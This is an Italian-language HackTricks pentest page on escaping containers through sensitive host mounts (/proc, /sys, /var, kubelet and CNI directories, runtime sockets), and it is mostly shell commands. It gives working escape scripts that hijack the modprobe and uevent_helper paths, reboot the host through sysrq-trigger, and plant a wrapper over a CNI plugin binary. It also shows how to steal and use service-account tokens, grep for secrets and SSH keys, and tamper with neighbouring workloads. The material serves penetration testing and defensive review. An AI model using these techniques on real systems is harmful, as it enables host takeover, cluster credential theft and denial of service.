# Sensitive Host Mounts

{{#include ../../../banners/hacktricks-training.md}}

## Overview

Gli host mounts sono una delle superfici pratiche più importanti per l'container-escape perché spesso fanno collassare una vista del processo attentamente isolata in una visibilità diretta delle risorse dell'host. I casi pericolosi non si limitano a `/`. Bind mounts di `/proc`, `/sys`, `/var`, runtime sockets, state gestito da kubelet, o path legati ai device possono esporre controlli del kernel, credentials, filesystem di container vicini e interfacce di gestione del runtime.

Questa pagina esiste separatamente dalle singole pagine di protezione perché il modello di abuso è trasversale. Un host mount scrivibile è pericoloso in parte a causa dei mount namespaces, in parte a causa dei user namespaces, in parte per la copertura di AppArmor o SELinux, e in parte per quale esatto path dell'host è stato esposto. Trattarlo come un argomento a sé rende la superficie d'attacco molto più facile da analizzare.

## `/proc` Exposure

procfs contiene sia normali informazioni sui processi sia interfacce di controllo del kernel ad alto impatto. Un bind mount come `-v /proc:/host/proc` o una vista del container che espone inaspettati entry di proc scrivibili può quindi portare a disclosure di informazioni, denial of service, o esecuzione diretta di codice sull'host.

I path di alto valore di procfs includono:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Abuse

Inizia verificando quali entry di procfs ad alto valore sono visibili o scrivibili:
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
Questi path sono interessanti per motivi diversi. `core_pattern`, `modprobe` e `binfmt_misc` possono diventare host code-execution path quando sono scrivibili. `kallsyms`, `kmsg`, `kcore` e `config.gz` sono potenti fonti di reconnaissance per kernel exploitation. `sched_debug` e `mountinfo` rivelano il contesto di process, cgroup e filesystem che può aiutare a ricostruire il layout dell'host dall'interno del container.

Il valore pratico di ciascun path è diverso, e trattarli tutti come se avessero lo stesso impatto rende il triage più difficile:

- `/proc/sys/kernel/core_pattern`
Se scrivibile, questo è uno dei path procfs a più alto impatto perché il kernel eseguirà un pipe handler dopo un crash. Un container che può puntare `core_pattern` a un payload memorizzato nel suo overlay o in un mounted host path può spesso ottenere host code execution. Vedi anche [read-only-paths.md](protections/read-only-paths.md) per un esempio dedicato.
- `/proc/sys/kernel/modprobe`
Questo path controlla l'helper userspace usato dal kernel quando deve invocare la logica di caricamento dei moduli. Se scrivibile dal container e interpretato nel contesto dell'host, può diventare un altro primitive di host code execution. È particolarmente interessante se combinato con un modo per attivare il helper path.
- `/proc/sys/vm/panic_on_oom`
Di solito non è un primitive di escape pulito, ma può trasformare la memory pressure in denial of service a livello di host convertendo le condizioni di OOM in comportamento di kernel panic.
- `/proc/sys/fs/binfmt_misc`
Se l'interfaccia di registration è scrivibile, l'attaccante può registrare un handler per un valore magic scelto e ottenere esecuzione nel contesto dell'host quando viene eseguito un file corrispondente.
- `/proc/config.gz`
Utile per kernel exploit triage. Aiuta a determinare quali subsystem, mitigations e funzionalità opzionali del kernel sono abilitati senza bisogno dei metadati dei package dell'host.
- `/proc/sysrq-trigger`
Soprattutto un path di denial-of-service, ma molto serio. Può reboot, panic o altrimenti interrompere immediatamente l'host.
- `/proc/kmsg`
Rivela i messaggi del ring buffer del kernel. Utile per host fingerprinting, crash analysis e in alcuni ambienti per leak di informazioni utili a kernel exploitation.
- `/proc/kallsyms`
Valioso quando leggibile perché espone le informazioni sui symbol del kernel esportati e può aiutare a superare le assunzioni sulla address randomization durante lo sviluppo di kernel exploit.
- `/proc/[pid]/mem`
Questa è un'interfaccia diretta alla memory del process. Se il target process è raggiungibile con le necessarie condizioni di tipo ptrace, può consentire di leggere o modificare la memory di un altro process. L'impatto realistico dipende molto da credentials, `hidepid`, Yama e restrizioni ptrace, quindi è un path potente ma condizionato.
- `/proc/kcore`
Espone una vista in stile core-image della memory di sistema. Il file è enorme e scomodo da usare, ma se è leggibile in modo significativo indica una superficie di memory dell'host esposta in modo grave.
- `/proc/kmem` and `/proc/mem`
Interfacce raw memory storicamente ad alto impatto. Su molti sistemi moderni sono disabilitate o fortemente ristrette, ma se presenti e utilizzabili devono essere trattate come finding critici.
- `/proc/sched_debug`
Leaka informazioni di scheduling e task che possono esporre le identità dei process dell'host anche quando altre viste dei process sembrano più pulite del previsto.
- `/proc/[pid]/mountinfo`
Estremamente utile per ricostruire dove vive davvero il container sull'host, quali path sono supportati da overlay e se un mount scrivibile corrisponde a contenuto dell'host o solo al layer del container.

Se `/proc/[pid]/mountinfo` o i dettagli dell'overlay sono leggibili, usali per recuperare il path dell'host del filesystem del container:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
Questi comandi sono utili perché diversi trucchi di host-execution richiedono di trasformare un path all’interno del container nel corrispondente path dal punto di vista dell’host.

### Full Example: `modprobe` Helper Path Abuse

Se `/proc/sys/kernel/modprobe` è scrivibile dal container e il helper path viene interpretato nel contesto dell’host, può essere reindirizzato verso un payload controllato dall’attaccante:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
Il trigger esatto dipende dal target e dal comportamento del kernel, ma il punto importante è che un writable helper path può reindirizzare una futura invocazione del kernel helper verso contenuti del host-path controllati dall'attaccante.

### Full Example: Kernel Recon With `kallsyms`, `kmsg`, And `config.gz`

Se l'obiettivo è la valutazione della sfruttabilità invece di un escape immediato:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
Questi comandi aiutano a rispondere se sono visibili informazioni utili sui simboli, se i messaggi recenti del kernel rivelano stati interessanti e quali funzionalità o mitigazioni del kernel sono compilate. L'impatto di solito non è una escape diretta, ma può ridurre drasticamente i tempi di triage delle vulnerabilità del kernel.

### Full Example: SysRq Host Reboot

Se `/proc/sysrq-trigger` è scrivibile e raggiunge la vista dell'host:
```bash
echo b > /proc/sysrq-trigger
```
L’effetto è il riavvio immediato dell’host. Questo non è un esempio sottile, ma dimostra chiaramente che l’esposizione di procfs può essere molto più grave della semplice divulgazione di informazioni.

## Esposizione di `/sys`

sysfs espone grandi quantità di stato del kernel e dei device. Molti path di sysfs sono utili soprattutto per il fingerprinting, mentre altri possono influenzare l’esecuzione di helper, il comportamento dei device, la configurazione dei security-module o lo stato del firmware.

I path sysfs ad alto valore includono:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Questi path contano per motivi diversi. `/sys/class/thermal` può influenzare il comportamento del thermal-management e quindi la stabilità dell’host in ambienti esposti in modo non corretto. `/sys/kernel/vmcoreinfo` può leakare informazioni sul crash-dump e sul layout del kernel che aiutano nel fingerprinting dell’host a basso livello. `/sys/kernel/security` è l’interfaccia `securityfs` usata dai Linux Security Modules, quindi un accesso inatteso lì può esporre o alterare stato relativo a MAC. I path delle variabili EFI possono influenzare le impostazioni di boot supportate dal firmware, rendendoli molto più gravi dei normali file di configurazione. `debugfs` sotto `/sys/kernel/debug` è particolarmente pericoloso perché è intenzionalmente un’interfaccia orientata agli sviluppatori, con molte meno aspettative di sicurezza rispetto alle API del kernel hardenizzate rivolte alla produzione.

I comandi utili per rivedere questi path sono:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
Cosa rende interessanti quei comandi:

- `/sys/kernel/security` può rivelare se AppArmor, SELinux, o un altro surface LSM è visibile in un modo che avrebbe dovuto restare solo sull'host.
- `/sys/kernel/debug` è spesso il finding più allarmante in questo gruppo. Se `debugfs` è montato ed è leggibile o scrivibile, aspettati un ampio surface rivolto al kernel, il cui rischio esatto dipende dai debug node abilitati.
- L'esposizione delle variabili EFI è meno comune, ma se presente ha un impatto alto perché tocca impostazioni supportate dal firmware invece di normali file runtime.
- `/sys/class/thermal` è principalmente rilevante per la stabilità dell'host e l'interazione con l'hardware, non per un elegante shell-style escape.
- `/sys/kernel/vmcoreinfo` è principalmente una fonte di host fingerprinting e crash analysis, utile per capire lo stato low-level del kernel.

### Full Example: `uevent_helper`

Se `/sys/kernel/uevent_helper` è scrivibile, il kernel può eseguire un helper controllato dall'attaccante quando viene attivato un `uevent`:
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
Il motivo per cui questo funziona è che il percorso dell'helper viene interpretato dal punto di vista dell'host. Una volta attivato, l'helper viene eseguito nel contesto dell'host invece che dentro il container corrente.

## Esposizione di `/var`

Montare `/var` dell'host in un container è spesso sottovalutato perché non sembra drammatico come montare `/`. In pratica può essere sufficiente per raggiungere socket di runtime, directory di snapshot dei container, volumi dei pod gestiti da kubelet, token di service-account proiettati e filesystem di applicazioni vicine. Su nodi moderni, `/var` è spesso il punto in cui vive davvero lo stato dei container più interessante dal punto di vista operativo.

### Esempio Kubernetes

Un pod con `hostPath: /var` può spesso leggere i token proiettati di altri pod e il contenuto degli snapshot overlay:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
Questi comandi sono utili perché rispondono se il mount espone solo dati applicativi banali o credenziali del cluster ad alto impatto. Un service-account token leggibile può trasformare immediatamente l’esecuzione di codice locale in accesso alle Kubernetes API.

Se il token è presente, verifica cosa può raggiungere invece di fermarti alla sua scoperta:
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
L'impatto qui può essere molto più ampio del solo accesso al nodo locale. Un token con RBAC esteso può trasformare un `/var` montato in una compromissione dell'intero cluster.

### Docker And containerd Example

Sugli host Docker i dati rilevanti si trovano spesso sotto `/var/lib/docker`, mentre sui nodi Kubernetes basati su containerd possono trovarsi sotto `/var/lib/containerd` o in percorsi specifici dello snapshotter:
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
Se il `/var` montato espone contenuti di snapshot scrivibili di un altro workload, l’attaccante potrebbe essere in grado di alterare file applicativi, inserire contenuti web o modificare script di startup senza toccare la configurazione del container corrente.

Idee concrete di abuso, una volta trovati contenuti di snapshot scrivibili:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
Questi comandi sono utili perché mostrano le tre principali famiglie di impatto dei mount di `/var`: application tampering, recupero di secret e lateral movement verso workload adiacenti.

## Kubelet State, Plugins, And CNI Paths

Un mount di `/var/lib/kubelet`, `/opt/cni/bin` o `/etc/cni/net.d` è spesso esposto tramite privileged DaemonSets, CNI agents, CSI node plugins, GPU operators e storage helpers. Questi mount sono facili da liquidare come "node plumbing", ma si trovano direttamente nel percorso di execution per i nuovi pod e spesso contengono credenziali kubelet, secret proiettati, socket di registration e binari plugin eseguibili sul lato host.

I target ad alto valore includono:

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

I comandi utili per la review sono:
```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```
Perché questi path sono importanti:

- `/var/lib/kubelet/pki` può esporre i certificati client del kubelet e altre credenziali locali del nodo che a volte possono essere riutilizzate contro l'API server o endpoint TLS esposti dal kubelet, a seconda del design del cluster.
- `/var/lib/kubelet/pods` spesso contiene token di service-account proiettati e Secrets montati per pod vicini sullo stesso nodo.
- `/var/lib/kubelet/pod-resources/kubelet.sock` è soprattutto una superficie di reconnaissance, ma molto utile: mostra quali pod e container possiedono attualmente GPU, hugepages, dispositivi SR-IOV e altre risorse locali scarse del nodo.
- `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins` e `/var/lib/kubelet/plugins_registry` rivelano quali CSI, DRA e device plugins sono installati e quali socket il kubelet si aspetta di usare. Se queste directory sono scrivibili invece che solo leggibili, il finding diventa molto più serio.
- `/opt/cni/bin` e `/etc/cni/net.d` si trovano direttamente sul percorso di setup della rete dei pod. L'accesso scrivibile lì è spesso un primitive di host-execution ritardato, non solo un'esposizione di configurazione.

### Full Example: Scrivibile `/opt/cni/bin`

Se una directory di binary CNI dell'host è montata read-write, sostituire un plugin può bastare per ottenere esecuzione sull'host la prossima volta che il kubelet crea un pod sandbox su quel nodo:
```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > /tmp/cni-triggered
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
```
Questo non è immediato come un `docker.sock` montato, ma spesso è più realistico in pod di infrastruttura Kubernetes compromessi. Il punto importante è che il binario modificato viene eseguito in seguito dal flow di setup della rete dell'host, non dal container corrente.


## Runtime Sockets

I sensitive host mounts spesso includono runtime sockets invece di directory complete. Sono così importanti che meritano una ripetizione esplicita qui:
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
Vedi [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) per i flussi completi di exploitation una volta che uno di questi socket è montato.

Come rapido pattern di prima interazione:
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
Se una di queste ha successo, il percorso da "mounted socket" a "avviare un container sibling con privilegi maggiori" di solito è molto più breve di qualsiasi percorso di kernel breakout.

## Mount-Related CVEs

Gli host mounts si intrecciano anche con le vulnerabilità del runtime. Esempi recenti importanti includono:

- `CVE-2024-21626` in `runc`, dove un directory file descriptor trapelato poteva posizionare la working directory sul filesystem dell'host.
- `CVE-2024-23651`, `CVE-2024-23652` e `CVE-2024-23653` in BuildKit, dove Dockerfiles malevoli, frontend e flussi `RUN --mount` potevano reintrodurre l'accesso a file dell'host, la cancellazione o privilegi elevati durante i build.
- `CVE-2024-1753` in Buildah e nei flussi di build di Podman, dove bind mounts costruiti ad arte durante il build potevano esporre `/` in read-write.
- `CVE-2025-47290` in `containerd` 2.1.0, dove un TOCTOU durante l'unpack dell'image poteva consentire a un image appositamente costruita di modificare il filesystem dell'host durante il pull.

Queste CVEs contano qui perché mostrano che la gestione dei mount non riguarda solo la configurazione dell'operatore. Anche il runtime stesso può introdurre condizioni di escape guidate dai mount.

## Checks

Usa questi comandi per individuare rapidamente le mount exposures di maggior valore:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Cosa è interessante qui:

- Host root, `/proc`, `/sys`, `/var` e le runtime sockets sono tutti finding ad alta priorità.
- Le voci proc/sys scrivibili spesso significano che il mount espone controlli kernel globali dell'host invece di una vista container sicura.
- I percorsi montati di `/var` meritano una review di credenziali e dei workload vicini, non solo una review del filesystem.
- Le directory di stato di kubelet e i percorsi CNI/plugin meritano la stessa priorità delle runtime sockets perché spesso si trovano direttamente sul path di creazione dei pod e distribuzione delle credenziali del node.

## References

- [Local Files And Paths Used By The Kubelet](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [cilium-agent container can access the host via `hostPath` mount](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
{{#include ../../../banners/hacktricks-training.md}}
